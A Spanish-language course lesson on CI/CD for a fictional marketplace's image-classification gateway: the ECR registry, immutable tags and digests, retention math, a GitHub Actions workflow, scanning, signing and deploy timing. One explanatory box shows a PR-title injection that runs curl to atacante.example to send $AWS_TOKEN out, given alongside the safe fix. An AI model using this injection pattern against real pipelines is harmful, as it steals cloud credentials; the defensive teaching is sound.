---
titulo: CI/CD y registro de imágenes
en: CI/CD and the image registry
subtitulo: El octavo paso del sistema de Alba de principio a fin: el workflow que prueba cada PR, arma la imagen del gateway una sola vez por commit, la guarda en un registro donde ningún nombre se reusa y lleva su digest hasta producción, con una persona que aprueba y una vuelta atrás que tarda segundos.
pregunta: Un cambio al gateway de Alba se acaba de juntar a main. ¿Qué tiene que pasar, solo y en orden, para que unos 18 minutos después corra en producción exactamente la imagen que se probó, y para que volver a la anterior no exija reconstruir nada?
requisitos: pruebas-ci, git, e07-empaquetado, ataques, identidad, e05-export
---

:::idea
CI/CD no termina cuando las pruebas salen en verde: termina cuando la imagen probada corre en producción. Esta estación arma cada imagen **una sola vez**, la guarda en un registro donde un nombre nunca cambia de contenido y le pasa al despliegue su **digest**, la huella exacta de lo que se probó. Así staging y producción corren los mismos bytes, y volver atrás es apuntar al digest anterior.
:::

Alba es la empresa que seguimos en todo el curso: un marketplace en línea que recibe ≈ 2.5 millones de publicaciones nuevas al día, con ≈ 3 fotos cada una, y sugiere la categoría de cada foto entre 500. La sugerencia la da una ResNet-50 servida con [[triton|Triton]] en 2 [[gpu|GPUs]] T4, una por zona. Todo corre en AWS, la nube de Amazon, sobre Kubernetes: el sistema que reparte y vigila programas en un grupo de máquinas, el **clúster**. Delante de Triton está el **gateway**, un programa en Python que recibe la foto de Ana, una vendedora que publica, y la prepara; corre en 3 a 12 copias, sin GPU. Lo cuida un equipo de ML de 5 personas.

Esta lección es una **estación**: un paso del sistema contado como trabajo de ingeniería completo. Las dos anteriores dejaron las piezas listas. «Código de serving» escribió el gateway y sus 26 pruebas; «Empaquetado con Docker» escribió sus dos recetas, el [[dockerfile|Dockerfile]] del gateway (una [[imagen-contenedor|imagen]] de ≈ 87 MB) y el de Triton (≈ 9.2 GB, con el [[engine-tensorrt|engine]] adentro: el modelo compilado para la T4).

En la lección «Pruebas y CI/CD» viste qué son [[ci|CI]] y [[cd|CD]], el [[runner-ci|runner]] y los [[ambiente|ambientes]], y el *workflow* del gateway (el archivo que le dice a GitHub qué correr) quedó a medias a propósito: **«aquí falta subir la imagen a un registro»**. Esta lección empieza justo ahí. No vuelve a explicar qué es CI: cuenta el caso concreto de Alba, archivo por archivo y minuto por minuto.

## Lo que entra, lo que sale y lo que se decide {In, out and what gets decided}

### Lo que entra

- **Un [[commit]] en `main`**: una versión nueva del código que llega a `main`, la [[rama]] principal del repositorio `alba/classifier`. O, antes, un [[pull-request|pull request]] (PR) que propone ese cambio; cuando se aprueba, un [[merge]] lo junta a `main`.
- **El código del gateway** en la carpeta `gateway/`, con sus 26 pruebas, que corren contra un Triton falso, sin GPU.
- **Las dos recetas**: el Dockerfile del gateway y el de Triton.
- **Para el modelo, aparte:** la versión 14 del [[registro-modelos|registro de modelos]], `resnet50-2026-10-01`, con su engine. El pipeline mensual, el proceso que reentrena el modelo cada mes, la dejó como [[champion-challenger|`challenger`]]: la candidata que todavía no atiende a nadie. La lección «Export, engine y paridad» cuenta cómo se hizo el engine.

### Lo que sale

- **La imagen del gateway en el registro**, `classifier-gateway:3f9c2ab`, probada, escaneada y firmada, con su [[digest-imagen|digest]] (`sha256:…`).
- **La imagen de Triton**, `classifier-triton:resnet50-2026-10-01`, solo cuando hay un modelo nuevo. La arma otro workflow, `triton-modelo`, que corre por botón una vez al mes en la máquina con T4; lo cuenta la sección extra «El workflow del modelo».
- **El reporte de las pruebas**, cuando algo falla.
- **La paridad de punta a punta en verde**: la prueba de que 20 fotos, mandadas por el gateway real con el Triton real, reciben la misma respuesta que con la versión aprobada.
- **Un cambio en el repositorio de despliegue**, un repositorio aparte que dice qué imagen corre en cada ambiente, para pedir ese digest: primero en staging, el ambiente de ensayo, y después en producción.

### Lo que se decide

:::pasos
1. Qué corre en cada PR y qué solo en main
Las pruebas, en cada PR; la imagen y todo lo que sigue, solo después del merge.
2. Dónde vive cada imagen y cuánto
Dos repositorios en el registro, con nombres que no se reusan y una regla de retención.
3. Cómo se llama cada imagen
El gateway, por su commit; Triton, por la versión del modelo.
4. Cómo llega el digest al despliegue y quién aprueba
Por un cambio en Git, con una persona que no hizo el cambio.
5. En qué máquina corre cada job
Las de GitHub para casi todo; una propia con T4 para lo que necesita la GPU.
:::

Y lo que la estación **no** decide: si el modelo es bueno (eso lo decidió el [[quality-gate|gate]], el examen automático del modelo), cómo se arma la imagen (la receta es de «Empaquetado con Docker») ni qué hace Kubernetes con ella (lo cuentan «Kubernetes» y «Rollout seguro»).

:::diagrama e08-cicd-estacion
La estación completa: lo que corre en un PR, lo que corre después del merge y el camino aparte del modelo. Toca cada caja; los recorridos siguen un PR, un merge y un modelo nuevo.
:::

## El registro: dónde vive cada imagen, y cuánto {The registry: where each image lives, and for how long}

Un *job* de CI, un trabajo del pipeline como «correr las pruebas», corre en una máquina que se borra al terminar. La imagen que construyó se borraría con ella. Necesita un lugar fijo, al que todos los [[nodo|nodos]] (las máquinas del clúster) puedan pedirla. Ese lugar es un [[registro-imagenes|registro de imágenes]] (*container registry*): un almacén de imágenes con nombre, al que se **sube** una imagen (*push*) y del que se **baja** (*pull*).

Un registro guarda las [[capa-imagen|capas]] de una imagen por separado, cada una con su huella (lo viste en «Empaquetado con Docker»), y una lista que dice qué capas forman cada imagen. Si dos imágenes comparten una capa, se guarda una vez; al subir, solo viajan las que el registro no tiene.

Alba usa **Amazon ECR** (*Elastic Container Registry*), el registro de AWS, en `us-east-1`, la misma [[region|región]] del clúster. Para servir tiene dos repositorios, uno por programa (la imagen de entrenamiento vive en otro):

| Repositorio | Qué guarda | Cada cuánto llega una |
|---|---|---|
| `classifier-gateway` | el gateway, ≈ 87 MB | con cada merge a `main`: ≈ 3 a 5 al día |
| `classifier-triton` | Triton con el engine horneado, ≈ 9.2 GB | con cada modelo nuevo: 1 al mes |

La dirección completa de una imagen es `123456789012.dkr.ecr.us-east-1.amazonaws.com/classifier-gateway:3f9c2ab`: la cuenta de AWS (de juguete), el registro, el repositorio y el tag. Los nodos llegan a ECR por [[vpc-endpoint|endpoints privados]], caminos de la red de Alba que no salen a internet (los cuenta «Redes en la nube»).

Un registro serio aporta más que espacio:

- **Quién entra.** Solo quien tiene permiso de [[iam|IAM]], el sistema de permisos de AWS, sube o baja. El job de CI sube; los nodos solo bajan.
- **Tags inmutables.** Un nombre, una vez usado, no se puede volver a usar. Lo ves en la sección siguiente.
- **Escaneo al subir.** ECR revisa cada imagen nueva contra la lista pública de vulnerabilidades conocidas: fallas de seguridad ya descubiertas en paquetes de software. Es una segunda red de seguridad: la primera corre antes, en el job de CI.
- **Retención.** Una regla que borra lo viejo, para que el repositorio no crezca para siempre.

:::ojo Registro de imágenes no es registro de modelos
Alba tiene dos registros con nombres parecidos. El registro de modelos ([[mlflow|MLflow]]) guarda **versiones del modelo**: el archivo [[onnx|ONNX]], el engine, sus huellas y los alias `champion` y `challenger`. El registro de imágenes (ECR) guarda **programas empaquetados**. Se tocan en un solo punto: el tag de la imagen de Triton es el nombre de la versión del modelo, `resnet50-2026-10-01`.
:::

:::profundo Qué viaja en un push
Con las capas y el manifest de «Empaquetado con Docker» (cada capa nombrada por el sha256 de su contenido; el digest de la imagen, el sha256 del manifest), un `docker push` va en un orden fijo: primero las capas, al final el manifest. Por cada capa, primero pregunta si el registro ya tiene ese sha256; si lo tiene, no la manda. Luego sube el manifest, y el registro responde con su digest. Por eso subir el gateway después de un cambio de código manda ≈ 48 KB y no 87 MB.

El pull es al revés: pide el manifest por tag o por digest, revisa qué capas le faltan y baja solo esas. Si pidió por digest, comprueba que el sha256 del manifest que recibió sea el que pidió: un registro que le diera otro contenido quedaría descubierto. Y cada capa también se comprueba contra su propio sha256.
:::

### Cuánto vive cada imagen

Una [[politica-retencion-imagenes|política de retención]] (*lifecycle policy*) es la regla del repositorio que dice qué imágenes se borran solas. La de Alba tiene tres partes: las imágenes **sin tag**, restos que nadie puede pedir por nombre, se borran al día; del gateway se guardan las **últimas 200**; de Triton, las **últimas 12**, un año de modelos.

¿Por qué contar imágenes y no días? Porque la regla no sabe qué imagen corre en producción. Una regla de «borra lo de más de 30 días» borraría la versión estable si nadie despliega en un mes, y con ella tu [[rollback]]: la vuelta a la versión anterior. Contando, la que corre y la anterior siempre están entre las últimas, mientras el número alcance para cubrir el tiempo que puedes necesitarlas.

:::formula Cuántos días cubre la retención y cuánto ocupa
d = frac{N}{m}
S = A + N × δ
S_{entera} = N × (A + δ)
C_{ecr} = S × p_{GB}
- N: cuántas imágenes guarda la regla
- m: cuántas imágenes nuevas llegan al día (en el gateway, los merges a `main`)
- d: cuántos días hacia atrás alcanza la lista, en días
- A: el tamaño de las capas que comparten todas las imágenes del repositorio, en MB o GB
- δ: el tamaño de la capa propia de cada imagen, la que cambia, en las mismas unidades que \(A\)
- S: lo que ocupa el repositorio con capas compartidas, en las unidades de \(A\); para calcular \(C_{ecr}\), en GB
- S_{entera}: lo que ocuparía si cada imagen se guardara entera, sin compartir capas, en las mismas unidades
- p_{GB}: el precio de guardar un GB durante un mes, en US$ por GB
- C_{ecr}: lo que cuesta guardarlo al mes en ECR, en US$
:::

La segunda línea es la que sorprende; la tercera es la comparación. En el gateway, la base y el entorno de Python (43 + 44 = 87 MB) solo cambian cuando cambian las dependencias; un cambio de código agrega una capa de ≈ 48 KB. Doscientas imágenes no son 200 × 87 MB.

:::cuenta La retención de Alba
Días que cubre el gateway, \(d\) // \(N\) = 200 imágenes, \(m\) = 3 a 5 merges al día | \(N ÷ m\) = 200 ÷ 5 y 200 ÷ 3 | ≈ 40 a 67 días
Capas compartidas del gateway, \(A\) // base `python:3.13-slim` + entorno, de «Empaquetado con Docker» | 43 + 44 | 87 MB
Repositorio del gateway, \(S\) // \(δ\) = 0.048 MB, la capa del código | \(A + N × δ\) = 87 + 200 × 0.048 | ≈ 97 MB
Si cada imagen se guardara entera, \(S_{entera}\) // sin capas compartidas | \(N × (A + δ)\) = 200 × 87.048 MB | ≈ 17.4 GB
Repositorio de Triton, \(S\) // \(δ\) ≈ 0.1 GB, la capa del engine (de 50 a 150 MB); \(A\) = la imagen de ≈ 9.2 GB menos su engine, 9.2 − 0.1 = 9.1 GB; \(N\) = 12 | \(A + N × δ\) = 9.1 + 12 × 0.1 | ≈ 10.3 GB
Lo que cuesta guardar los dos, \(C_{ecr}\) // \(p_{GB}\) ≈ US$0.10 por GB al mes, el precio de lista de ECR en noviembre de 2026; \(S_{gw}\) del gateway + \(S_{tr}\) de Triton, en GB (97 MB = 0.097 GB) | \((S_{gw} + S_{tr}) × p_{GB}\) = (0.097 + 10.3) × 0.10 | ≈ US$1 al mes
= Guardar un año de modelos y dos meses de gateways cuesta ≈ US$1 al mes, porque casi todo son capas repetidas. La retención no está para ahorrar: está para que la lista no crezca sin fin y para que el rollback siempre encuentre su imagen.
:::

:::figura e08-cicd-capas
Doscientas imágenes del gateway en el registro: comparten la base y el entorno, y cada una agrega solo su capa de código.
:::

Ojo con la cuenta de Triton: supone que los 12 modelos usan la misma [[release-ngc|release]] de Triton, la misma versión publicada por NVIDIA. Si a mitad del año se cambia la base a otra release, las imágenes de antes y las de después ya no comparten esos ≈ 9 GB, y el repositorio casi se duplica. Sigue costando poco.

:::calculadora e08-cicd-retencion
Empieza con el gateway y \(m\) = 4, el medio de 3 a 5 merges al día: la lista alcanza 50 días. Baja \(m\) a 1 merge al día: la lista alcanza 200 días. Luego pon \(δ\) = 87, como si cada imagen cambiara también sus dependencias: así se ve un repositorio donde nada se comparte.
:::

## Nombres que no se reusan: tags inmutables y el digest {Names that are never reused: immutable tags and the digest}

En «Empaquetado con Docker» viste los dos nombres de una imagen. El [[tag-imagen|tag]] es una etiqueta legible, `3f9c2ab`, que una persona escoge. El **digest** es la huella sha256 del contenido: si cambia un byte, cambia el digest. Un tag es un letrero que **apunta** a un digest, y en casi todos los registros, por omisión, el letrero se puede mover.

### Cómo se llama cada imagen en Alba

- **El gateway**: los 7 primeros caracteres del identificador del commit que la produjo, `classifier-gateway:3f9c2ab`. Con ese nombre, `git show 3f9c2ab`, el comando de Git que enseña un commit, muestra el código exacto.
- **Triton**: la versión del modelo, `classifier-triton:resnet50-2026-10-01`. El código de Triton no cambia; lo que cambia es el engine.
- **Nunca `:latest`**. Ese tag, por costumbre, apunta a lo último que alguien subió. Tiene tres problemas: no dice qué código es, cambia de contenido sin avisar, y dos nodos que lo bajan con una hora de diferencia pueden correr cosas distintas.

### El tag que no se mueve

Un [[tag-inmutable|tag inmutable]] (*tag immutability*) es una opción del repositorio: si un tag ya existe, el registro rechaza cualquier push nuevo con ese nombre. En ECR no viene prendida; Alba la prende en los dos repositorios de servir. Desde ese momento, `3f9c2ab` nombra un solo contenido para siempre.

¿No bastaría con no reusar los tags? Mira qué pasa cuando alguien reconstruye. El código de abajo es un registro de juguete: guarda tags y contenidos como un registro real. El lunes se sube una imagen; el martes alguien reconstruye el mismo commit y la sube con el mismo tag. Una reconstrucción casi nunca da los mismos bytes: cambian fechas dentro de la imagen, y a veces un paquete de la base.

```python
import hashlib

def digest(contenido):                      # la huella del contenido (aquí, sus 12 primeros caracteres)
    return "sha256:" + hashlib.sha256(contenido).hexdigest()[:12]

class Registro:                             # un registro de juguete: tags y contenidos
    def __init__(self, inmutable):
        self.inmutable, self.tags, self.blobs = inmutable, {}, {}
    def push(self, tag, contenido):
        d = digest(contenido)
        if self.inmutable and self.tags.get(tag, d) != d:
            return f"push {tag}: RECHAZADO, ese tag ya nombra otro contenido"
        self.tags[tag], self.blobs[d] = d, contenido
        return f"push {tag} → {d}"
    def pull(self, nombre):                 # por tag o por digest
        return self.blobs[self.tags.get(nombre, nombre)].decode()

for inmutable in (False, True):
    ecr = Registro(inmutable)
    print("Tags inmutables:" if inmutable else "Tags que se pueden pisar:")
    print("  lunes ", ecr.push("3f9c2ab", b"imagen del lunes"))
    probado = ecr.tags["3f9c2ab"]           # el digest que se probó en staging
    print("  martes", ecr.push("3f9c2ab", b"la misma, reconstruida el martes"))
    print("  pull por tag:   ", ecr.pull("3f9c2ab"))
    print("  pull por digest:", ecr.pull(probado))
```

```salida
Tags que se pueden pisar:
  lunes  push 3f9c2ab → sha256:7beccf91096f
  martes push 3f9c2ab → sha256:9e7f53bf11c9
  pull por tag:    la misma, reconstruida el martes
  pull por digest: imagen del lunes
Tags inmutables:
  lunes  push 3f9c2ab → sha256:7beccf91096f
  martes push 3f9c2ab: RECHAZADO, ese tag ya nombra otro contenido
  pull por tag:    imagen del lunes
  pull por digest: imagen del lunes
```

Con tags que se pisan, el mismo nombre ya da otra cosa: lo que se probó el lunes no es lo que baja un nodo el martes. Con tags inmutables, el segundo push falla y el nombre sigue diciendo la verdad. Fíjate en la última línea de cada bloque: **por digest**, siempre baja lo del lunes, haya o no inmutabilidad. Por eso Alba usa los dos: el tag para que lo lea una persona, el digest para fijar lo que corre.

:::figura e08-cicd-inmutable
Arriba, un tag que se puede mover: el martes apunta a otro contenido y el nodo baja algo que nadie probó. Abajo, con tags inmutables, el registro rechaza el segundo push.
:::

:::ojo Un re-run que falla en el push no es un bug
Si vuelves a correr (*re-run*) el workflow de un commit que ya se publicó, el job de imagen reconstruye y ECR rechaza el push con `ImageTagAlreadyExistsException`, porque ese tag ya existe (y, además, la imagen reconstruida casi seguro trae otro digest). Es la inmutabilidad haciendo su trabajo. La imagen de ese commit ya existe: no hay nada que volver a subir.
:::

### Construir una vez y promover

De ahí sale la regla central de la estación: la imagen se construye **una sola vez**, en CI, y lo que avanza de una etapa a la siguiente es su digest. A eso se le dice [[promocion-imagen|promover una imagen]] (*build once, promote*): staging y producción corren el mismo `sha256:…`, sin reconstruir nada. Lo que cambia entre ambientes es la configuración (por ejemplo, a qué Triton le habla el gateway), nunca la imagen. Y el rollback es volver a pedir el digest anterior, que sigue en el registro gracias a la retención.

## El workflow del gateway, job por job {The gateway workflow, job by job}

Un [[workflow-actions|workflow]] de [[github-actions|GitHub Actions]], el servicio de CI de GitHub, es un archivo [[yaml|YAML]] en `.github/workflows/` que dice qué hacer, cuándo y en qué máquina. El de Alba se llama `gateway.yml`. Se arma con [[job-actions|jobs]]: cada job corre en su propio runner limpio y tiene sus pasos (*steps*) en orden. `needs` hace que un job espere a otros, e `if` decide si un job corre.

El de Alba hace dos cosas distintas según qué lo dispara:

- **En cada PR:** `lint` (ruff y mypy, dos [[linter|linters]] que revisan el código sin correrlo) y `pruebas` (las 26), a la vez. Nada más. Ninguna imagen se publica desde un PR.
- **En cada merge a `main`:** lo mismo, y después, uno tras otro, `imagen` (build, prueba de humo, escaneo, push y firma), `paridad` (en el runner con T4), `staging` y `produccion`, que espera a que una persona apruebe.

¿Por qué no publicar desde el PR? Porque en un PR el commit que prueba GitHub no es el tuyo: es un **merge de prueba** de tu rama con `main`, que no existe en ninguna rama. Una imagen con ese nombre no la explicaría ningún commit. Y un PR puede venir de cualquiera; un merge a `main` ya pasó por revisión.

Este es el workflow, recortado a lo que importa. Es una **ilustración**: solo corre dentro de GitHub, y los pasos de `lint` y `pruebas` son los de «Pruebas y CI/CD». Las líneas `uses:` traen **acciones**: pasos ya hechos por otros, como «entrar a AWS». Las de terceros se [[fijar-con-hash|fijan]] por el identificador completo de su commit, para que nadie pueda cambiarlas por debajo, como pide «Ataques y cadena de suministro»; aquí se abrevia como `@<sha>`.

```yaml
# .github/workflows/gateway.yml (ilustración)
on:
  pull_request:                       # cada PR, sin filtro de carpetas (ver abajo)
  push:
    branches: [main]
permissions:
  contents: read                      # lo mínimo: leer el código
env:
  REPO: 123456789012.dkr.ecr.us-east-1.amazonaws.com/classifier-gateway

jobs:
  lint:    { runs-on: ubuntu-24.04, timeout-minutes: 10, steps: … }   # ruff y mypy
  pruebas: { runs-on: ubuntu-24.04, timeout-minutes: 10, steps: … }   # las 26

  imagen:
    needs: [lint, pruebas]
    if: github.event_name == 'push'    # solo después del merge a main
    runs-on: ubuntu-24.04
    timeout-minutes: 20
    permissions: { contents: read, id-token: write }   # id-token: para OIDC
    outputs:
      digest: ${{ steps.push.outputs.digest }}          # lo que sale del job
    steps:
      - uses: actions/checkout@v7
      - uses: aws-actions/configure-aws-credentials@<sha>   # credenciales por OIDC
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-classifier-gateway
          aws-region: us-east-1
      - uses: aws-actions/amazon-ecr-login@<sha>
      - uses: docker/setup-buildx-action@<sha>
      - run: echo "TAG=${GITHUB_SHA::7}" >> "$GITHUB_ENV"   # TAG=3f9c2ab, para los pasos de abajo
      - uses: docker/build-push-action@<sha>
        with:
          context: gateway
          platforms: linux/amd64
          load: true                   # la deja en la máquina; todavía no la sube
          tags: ${{ env.REPO }}:${{ env.TAG }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
      - run: ./ci/humo.sh && ./ci/sbom_y_escaneo.sh    # si algo falla, no hay push
      - id: push
        run: ./ci/push.sh             # sube y escribe digest=sha256:… en $GITHUB_OUTPUT
      - run: cosign sign --yes "$REPO@${{ steps.push.outputs.digest }}"   # firma ese digest

  paridad:
    needs: imagen
    runs-on: [self-hosted, linux, x64, gpu-t4]
    timeout-minutes: 15
    steps: …                           # las 20 fotos por el gateway de ese digest

  staging:
    needs: [imagen, paridad]
    steps: …                           # cambio en el repo de despliegue + humo

  produccion:
    needs: [imagen, staging]
    environment: produccion            # espera a que una persona apruebe
    concurrency: { group: deploy-gateway-produccion, cancel-in-progress: false }
    steps: …
```

Para leerlo: `${{ … }}` es un hueco que GitHub llena con un valor antes de correr el paso; `run:` es un comando de la [[terminal]]; `runs-on` dice en qué máquina corre el job, y `timeout-minutes`, cuánto puede tardar antes de que GitHub lo detenga. Con eso, tres cosas se ven ahí. `needs` arma la cadena: un job en rojo detiene todo lo que sigue. `if` separa el PR del merge. Y `outputs` saca el digest del job `imagen` para que los de abajo lo lean como `needs.imagen.outputs.digest`. La sección siguiente abre ese job.

### Permisos: lo mínimo, y un permiso más donde hace falta

Cada job recibe un token de GitHub, una contraseña temporal, para tocar el repositorio. Los [[permisos-workflow|permisos del workflow]] (`permissions`) dicen qué puede hacer: arriba, para todos, solo `contents: read`. El job `imagen` agrega uno, `id-token: write`, que no deja escribir nada en el repositorio: deja **pedir un token de identidad** para entrar a AWS sin llaves guardadas. En este recorte, ningún otro job lo pide; un job que también tuviera que entrar a AWS lo pediría para él, con su propio [[rol-iam|rol]] de AWS. Cómo funciona lo cuenta la sección extra «Credenciales sin llaves».

### El check obligatorio y la trampa de las carpetas

En el repositorio de Alba, una regla de la rama `main` dice que un PR no se puede juntar si `pruebas` no está en verde. Eso es un [[check-obligatorio|check obligatorio]] (*required status check*). Sin él, el rojo del PR sería un consejo.

El workflow de «Pruebas y CI/CD» filtraba con `paths: ["gateway/**"]`, para correr solo si el PR tocaba el gateway. Con un check obligatorio, eso atora: un PR que solo cambia `model_repository/classifier/config.pbtxt`, la [[config-pbtxt|configuración de Triton]], no dispara el workflow, `pruebas` nunca reporta, y el PR se queda para siempre en «esperando el resultado». Por eso el de Alba corre en **todos** los PR. Si se quisiera saltar trabajo, la condición iría en un `if` del job: un job saltado por `if` cuenta como aprobado; uno que nunca arrancó, no.

:::profundo Un título de PR que se vuelve comando
GitHub sustituye cada `${{ … }}` en el texto del paso **antes** de correrlo. Si un paso dice `run: echo "${{ github.event.pull_request.title }}"`, el título del PR se pega dentro del comando. Un PR titulado `x"; curl https://atacante.example/$AWS_TOKEN; echo "` convierte el `echo` en tres comandos, y el segundo, `curl` (un comando que hace una request por HTTP), manda lo que haya en esa variable a otro servidor. Es una **inyección**: un texto que viene de fuera y termina corriendo como código, de la misma familia que la [[inyeccion-prompt|inyección de prompt]] de «Ataques y cadena de suministro».

La forma segura es pasar el texto como variable de entorno, `env: { TITULO: ${{ github.event.pull_request.title }} }`, y usar `"$TITULO"` en el comando: la terminal lo trata como texto, no como código. La regla general: nada que escriba alguien de fuera (títulos, nombres de rama, comentarios) va directo dentro de un `run:`.
:::

## El job imagen y el camino de 17.5 minutos {The image job and the 17.5-minute path}

El job `imagen` es el corazón de la estación. Hace seis cosas, en este orden, y el orden importa:

:::pasos
1. Entra a AWS
Le pide a GitHub un token de identidad, un papel firmado que dice qué job es, y lo cambia por credenciales de un [[rol-iam|rol]] (una identidad de AWS con permisos fijos) que vencen solas en una hora. Luego entra a ECR con ellas.
2. Construye
Arma la imagen para `linux/amd64`, la [[plataforma-imagen|plataforma]] de los nodos de Alba. El runner de GitHub ya es Linux x64, el mismo tipo de procesador, así que no hay que imitar otro (emulación), que haría el build mucho más lento. La imagen queda en la máquina, todavía sin subir.
3. Prueba de humo
Prende un [[contenedor]] de esa imagen con un Triton falso: `/healthz`, el endpoint que dice «estoy vivo», responde 200 (todo bien) y un `POST /v1/classify` regresa categorías. Es la [[prueba-humo|prueba de humo]] de «Pruebas y CI/CD», ahora contra la imagen real.
4. SBOM y escaneo
Lista lo que trae la imagen (su [[sbom|SBOM]]) y lo [[escaneo-vulnerabilidades|escanea]]. Si encuentra un [[cve|CVE]] (una vulnerabilidad conocida, con su número) crítico que ya tiene parche, el job falla **antes** del push.
5. Push y digest
Sube la imagen con el tag de 7 caracteres. ECR responde con el digest, y el paso lo escribe como salida del job.
6. Firma
[[firma-imagen|Firma]] ese digest con la identidad del job, sin llave guardada. Al desplegar, la [[politica-admision|política de admisión]] del clúster, la regla que revisa cada imagen antes de dejarla correr, rechaza lo que no tenga esa firma.
:::

Los controles de la cadena de suministro ya los viste en «Ataques y cadena de suministro»; aquí está **en qué paso** corre cada uno. Escanear antes del push significa que una imagen con un CVE crítico nunca llega al registro. Firmar después del push significa que se firma el digest que el registro guardó, no otro.

:::profundo Cuando el escaneo falla
El escaneo no falla por cualquier hallazgo. La regla de Alba: falla con un CVE **crítico** que **ya tiene parche**. Uno sin parche no se arregla subiendo una versión, y bloquear por él dejaría al equipo sin poder publicar nada. Cuando falla, hay dos salidas: actualizar el paquete o la base en un PR, que vuelve a pasar por todo el pipeline, o registrar una **excepción**: un archivo en el repositorio que nombra el CVE, explica por qué no aplica y tiene fecha de vencimiento. La excepción pasa por revisión como cualquier cambio. Y si el registro tiene prendido el escaneo continuo de ECR (el escaneo «mejorado», que hace Amazon Inspector y se paga aparte), que vuelve a revisar lo que ya guardó, un CVE que se descubre después del push también aparece, aunque la imagen ya esté en producción.
:::

### El digest viaja como salida del job

Cuando el job `imagen` termina, su máquina se borra. Lo único que sobrevive para los jobs de abajo son sus [[outputs-job|salidas]] (*outputs*): textos cortos que un paso escribe en un archivo especial, `$GITHUB_OUTPUT`, y que el job declara en `outputs`. El paso `push` escribe una línea, `digest=sha256:…`, y desde ahí `paridad`, `staging` y `produccion` usan ese valor, no el tag. Así es imposible que un job de abajo despliegue algo distinto de lo que `imagen` probó y escaneó.

### Cuánto tarda, del merge a producción

Los tiempos de cada job son supuestos del equipo de Alba. La regla para sumarlos es la de «Pruebas y CI/CD»: lo que corre a la vez cuenta solo lo que tarda el más lento; lo que corre uno tras otro se suma.

:::formula Del merge a producción
t_{CI} = max(t_{lint}, t_{pruebas}) + t_{img} + t_{push}
t_{total} = t_{CI} + t_{par} + t_{stg} + t_{prod}
- t_{lint}: los minutos del job `lint`
- t_{pruebas}: los minutos del job `pruebas`, que corre a la vez que `lint`
- max(a, b): el mayor de los dos números; de dos jobs que corren a la vez, cuenta el más lento
- t_{img}: los minutos de construir la imagen y probarla (humo y escaneo)
- t_{push}: los minutos de subirla al registro
- t_{CI}: los minutos del merge a la imagen lista en el registro
- t_{par}: los minutos de la paridad de punta a punta
- t_{stg}: los minutos de desplegar en staging (stg) con su prueba de humo
- t_{prod}: los minutos de desplegar en producción (prod), de copia en copia
- t_{total}: los minutos del merge a producción, sin contar la espera de la aprobación
:::

:::cuenta Del merge a producción: el gateway de Alba
Lint, \(t_{lint}\) // ruff y mypy; supuesto del equipo | — | ≈ 1 min
Pruebas, \(t_{pruebas}\) // las 26, a la vez que lint; supuesto del equipo | — | ≈ 2 min
Imagen, \(t_{img}\) // el build desde cero, de 30 a 60 s según «Empaquetado con Docker», más humo y escaneo; supuesto del equipo | — | ≈ 1 min
Push, \(t_{push}\) // solo las capas nuevas; supuesto del equipo | — | ≈ 1 min
Merge a imagen en ECR, \(t_{CI}\) | \(max(t_{lint}, t_{pruebas}) + t_{img} + t_{push}\) = max(1, 2) + 1 + 1 | ≈ 4 min
Paridad, \(t_{par}\) // prender la T4 y bajar las imágenes, ≈ 4 min, y las 20 fotos, ≈ 1 min; supuesto del equipo | 4 + 1 | ≈ 5 min
Staging, \(t_{stg}\) // ≈ 3 min de copias nuevas + ≈ 30 s (0.5 min) de humo; supuesto del equipo | 3 + 0.5 | ≈ 3.5 min
Producción, \(t_{prod}\) // de copia en copia, sin apagar el servicio; supuesto del equipo | — | ≈ 5 min
Total, \(t_{total}\) | \(t_{CI} + t_{par} + t_{stg} + t_{prod}\) = 4 + 5 + 3.5 + 5 | ≈ 17.5 min
= Unos 17.5 minutos del merge a producción, más lo que tarde la persona en aprobar. Son 5 minutos más que los ≈ 12.5 de «Pruebas y CI/CD»: el push que ahí faltaba y los ≈ 4 minutos de prender la T4, que ahí no se sumaban porque la paridad contaba solo su examen.
:::

:::figura e08-cicd-tiempos
Los jobs del gateway en una línea de tiempo: lint y pruebas a la vez, y lo demás uno tras otro. La espera de la aprobación va entre staging y producción.
:::

Fíjate dónde está el tiempo: ≈ 8.5 de los 17.5 minutos son desplegar (\(t_{stg} + t_{prod}\) = 3.5 + 5), y ≈ 4 más son prender la T4 y bajar las imágenes. Acelerar las pruebas un minuto cambia poco; lo que alarga de verdad el camino es la espera de la aprobación, que puede ser de minutos o de horas.

:::profundo La caché en una máquina que se borra
En «Empaquetado con Docker» viste que el orden de las capas hace que un cambio de código reconstruya solo la última, en 2 a 5 segundos en vez de 30 a 60. Pero esa [[cache-build|caché]] vive en el disco de la máquina que construyó, y el runner de GitHub nace vacío en cada job.

La [[cache-actions|caché de Actions]] lo resuelve: `cache-to: type=gha,mode=max` guarda las capas en el almacén de caché de GitHub al terminar, y `cache-from: type=gha` las trae en la siguiente corrida. `mode=max` guarda también las capas de la [[multi-stage|etapa]] `builder`, la que instala los paquetes, que no quedan en la imagen final. GitHub da, por omisión, 10 GB de caché por repositorio (más espacio se paga aparte) y borra lo que no se usa en 7 días. Con un gateway de 87 MB sobra; la imagen de Triton, de 9.2 GB, casi la llenaría ella sola, y es una razón más para que esa imagen no se construya en un runner de GitHub.

Dos relojes más protegen el pipeline. `timeout-minutes` mata un job atorado: sin él, un job colgado espera 360 minutos, el máximo de los runners de GitHub. Y un job que espera aprobación en un `environment` falla solo a los 30 días.
:::

## Del digest al clúster: GitOps, aprobación y la paridad de punta a punta {From digest to cluster: GitOps, approval and end-to-end parity}

El job `imagen` deja un digest. Ahora hay que lograr que el clúster lo corra, primero en staging y luego en producción.

### La paridad de punta a punta

Staging vive en el mismo clúster que producción, en su propio *namespace* (un apartado con nombre dentro del clúster), `classifier-staging`, con su propia T4. Antes de desplegar nada, el job `paridad` hace el último examen del camino de la foto. Prende el gateway de ese digest y la imagen de Triton que sirve hoy, como en staging, y manda por el gateway las 20 fotos de referencia, en JPEG, como las mandaría la app de Ana.

Ese job corre en el [[runner-self-hosted|runner propio]] con T4: una máquina con GPU de Alba que se prende solo para un job y se borra al terminar. Hace falta porque el examen necesita el Triton real con el engine real, y los runners de GitHub no traen GPU. Nunca corre código de un PR, que podría venir de cualquiera, porque la máquina tiene permisos en AWS. Prendida solo cuando trabaja cuesta ≈ US$5 al mes; prendida siempre, ≈ US$384 (la cuenta está en la sección extra del workflow del modelo).

